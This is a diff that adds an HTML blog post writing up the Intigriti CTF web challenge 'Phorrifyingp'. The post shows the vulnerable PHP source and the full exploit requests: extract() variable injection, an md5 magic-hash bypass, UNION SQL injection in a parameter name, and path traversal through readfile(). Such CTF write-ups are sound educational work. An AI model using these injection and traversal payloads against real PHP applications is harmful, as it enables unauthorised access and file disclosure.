@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Intigriti CTF — Phorrifyingp | /home/Gal1leo</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Intigriti CTF — Phorrifyingp" />
+<meta name="author" content="Cillian" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="In this post I’ll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag." />
+<meta property="og:description" content="In this post I’ll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag." />
+<link rel="canonical" href="http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp.html" />
+<meta property="og:url" content="http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp.html" />
+<meta property="og:site_name" content="/home/Gal1leo" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-03-12T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Intigriti CTF — Phorrifyingp" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Cillian"},"dateModified":"2022-03-12T00:00:00+00:00","datePublished":"2022-03-12T00:00:00+00:00","description":"In this post I’ll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag.","headline":"Intigriti CTF — Phorrifyingp","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp.html"},"url":"http://localhost:4000/2022/03/12/Intigriti-CTF-Phorrifyingp.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>/home/Gal1leo</h1>
+        </a>
+        <h2>Computer Science student. Interested in web exploitation, programming and cyber security. Occasionally partake in CTFs and bug bounties.</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>12 March 2022</small>
+<h1>Intigriti CTF — Phorrifyingp</h1>
+
+<p class="view">by Cillian</p>
+
+<p>In this post I’ll discuss the first challenge our team solved as part of the Intigriti CTF. This was a php web challenge where we were given the source and asked to read the contents of the file to retrieve a flag.</p>
+
+<!-- read more -->
+
+<h2 id="initial-assessment">Initial Assessment</h2>
+<p>The source code for the challenge can be seen below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php  
+    /*  
+    &lt;flag&gt; ➡➡➡ ⛳🏁 ⬅⬅⬅ &lt;flag&gt;  
+    */  
+    if ($_SERVER['REQUEST_METHOD'] == 'POST'){  
+	    extract($_POST);  
+      
+	    if (isset($_POST['password']) &amp;&amp; md5($_POST['password']) == 'put hash here!'){  
+		    $loggedin = true;  
+	    }  
+      
+	    if (md5($_SERVER['REMOTE_ADDR']) != '92d3fd4057d07f38474331ab231e1f0d'){  
+	    header('Location: ' . $_SERVER['REQUEST_URI']);  
+	    }  
+	      
+	    if (isset($loggedin) &amp;&amp; $loggedin){  
+		    echo 'One step closer 😎&lt;br&gt;';  
+	      
+		    if (isset($_GET['action']) &amp;&amp; md5($_GET['action']) == $_GET['action']){  
+			    echo 'Really? 😅&lt;br&gt;';  
+			      
+			    $db = new SQLite3('database.db');  
+			    $sql_where = Array('1=0');  
+			      
+			    foreach ($_POST as $key =&gt; $data) {  
+				    $sql_where[] = $db-&gt;escapeString($key) . "='" . $db-&gt;escapeString($data) . "'";  
+			    }  
+			      
+			    $result = $db-&gt;querySingle('SELECT login FROM users WHERE ' . implode(' AND ', $sql_where));  
+			      
+			    if ($result == 'admin'){  
+				    echo 'Last step 🤣&lt;br&gt;';  
+			      
+				    readfile(file_get_contents('php://input'));  
+				}  
+		    }  
+	    }  
+    }  
+?&gt; 
+</code></pre></div></div>
+
+<p>We can see that this challenge will require us to bypass a number of conditional statements in order to execute the final readfile() function, where we will then need to modify our payload so that we can read a file.</p>
+
+<h2 id="step-1-were-logged-in">Step 1: We’re Logged In!</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($loggedin) &amp;&amp; $loggedin)
+</code></pre></div></div>
+
+<p>The first important conditional statement is checking if the $loggedin variable is true. We notice a suspicious usage of the extract() function above this. This function allows variables to be extracted from arrays. It’s being run on $_POST which is our POST input (user/attacker controlled). This will allow us to not only declare variable, but also to assign values to them using POST data.</p>
+
+<p>We can simply pass a loggedin parameter with a value of true.</p>
+
+<blockquote>
+  <p>POST / HTTP/1.1 Host: phorrifyingp.ctf.intigriti.io Content-Type:
+application/x-www-form-urlencoded Content-Length: 32</p>
+
+  <p>loggedin=true</p>
+</blockquote>
+
+<p>Once sent, we see the confirmation on the page:</p>
+
+<blockquote>
+  <p>One step closer 😎</p>
+</blockquote>
+
+<h2 id="step-2-its-magic">Step 2: It’s Magic!</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if (isset($_GET['action']) &amp;&amp; md5($_GET['action']) == $_GET['action'])
+</code></pre></div></div>
+
+<p>The next conditional statement is checking for a GET parameter named “action”. This parameter must satisfy the condition that its value is equal to its md5 value.</p>
+
+<p>This seems very unlikely. In fact, it takes a little bit of understanding about php <a href="https://www.whitehatsec.com/blog/magic-hashes/">magic hashes</a> to understand how this condition could be satisfied.</p>
+
+<p>In short, the use of “==” allows for comparison of different object types. If we wanted to compare the literal value, we’d use “===”. If we enter a String with a value such as “0e1”, this will effectively equal 0 to the power of 1 (which is 0). In fact, 0 to the power of any number will always result in 0.</p>
+
+<p>Using this logic, we simply need an input beginning with 0e and followed by a series of numbers which results in a md5 hash which also begins with 0e and is followed by a series of numbers.</p>
+
+<p>Once such input is “0e215962017”. The md5 value of which is “0e291242476940776845150308577824”.</p>
+
+<p>Placing this as a GET parameter, we will get one step closer.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
+Host: phorrifyingp.ctf.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 13
+
+loggedin=true
+</code></pre></div></div>
+
+<p>We get the confirmation:</p>
+
+<blockquote>
+  <p>Really? 😅</p>
+</blockquote>
+
+<h2 id="step-3-state-of-the-union">Step 3: State Of The Union</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if ($result == 'admin')
+</code></pre></div></div>
+
+<p>The last conditional statement checks if $result is equal to ‘admin’. This value comes from a SQL statement. Each of the parameters we pass in our POST data will become a part of this query. They are joined with the ‘AND’ condition. The clause array is initially populated with “1=0” which can never be true.</p>
+
+<p>Firstly, we encounter errors about “no such column loggedin”, which hints that we’ll need to find a way to get rid of this part of the query, we can do so by commenting it out.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1--=aaaa&amp;loggedin=true
+</code></pre></div></div>
+
+<p>Next, we notice that the current state of the query will never be true due to the “1=0” condition. This hints towards us using a UNION query to separately select the “admin” entry. We inject this into the parameter name.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
+Host: phorrifyingp.ctf.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 52
+
+1/**/UNION/**/SELECT/**/"admin"--=aaaa&amp;loggedin=true
+</code></pre></div></div>
+
+<p>We receive the confirmation that we have bypassed this check:</p>
+
+<blockquote>
+  <p>Last step 🤣</p>
+</blockquote>
+
+<h2 id="step-4-traversing-the-plane">Step 4: Traversing The Plane</h2>
+
+<blockquote>
+  <p>Warning&lt;/b&gt;: 
+readfile(1/**/UNION/**/SELECT/**/"admin"–=aaaa&amp;loggedin=true):
+failed to open stream: No such file or directory in
+/var/www/html/index.php</p>
+</blockquote>
+
+<p>As we can see from the error above, the entire POST data payload is being sent into the readfile() function.</p>
+
+<p>We can enter invalid directories, as long as we traverse back out of them. Using “..” we are in effect removing it from the path <strong>before</strong> it is ever searched for.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?action=0e215962017 HTTP/2
+Host: phorrifyingp.ctf.intigriti.io
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 108
+
+1/**/UNION/**/SELECT/**/"admin"--=a&amp;loggedin=true&amp;test=/../../../../../../../../../../var/www/html/index.php
+</code></pre></div></div>
+
+<p>And we get the flag:</p>
+
+<blockquote>
+  <p>1337UP{PHP_SCARES_ME_IT_HAUNTS_ME_WHEN_I_SLEEP_ALL_I_CAN_SEE_IS_PHP_PLEASE_SOMEONE_HELP_ME}</p>
+</blockquote>
+
+<h2 id="final-notes">Final Notes</h2>
+<p>Thanks to all members of “Team Ireland Without RE” with special thanks to <a href="https://twitter.com/0daystolive">@0daystolive</a>.</p>
+
+
+
+  <small>tags: <em>ctf</em> - <em>web</em></small>
+
+
+      </section>
+    </div>
+  </body>
+</html>
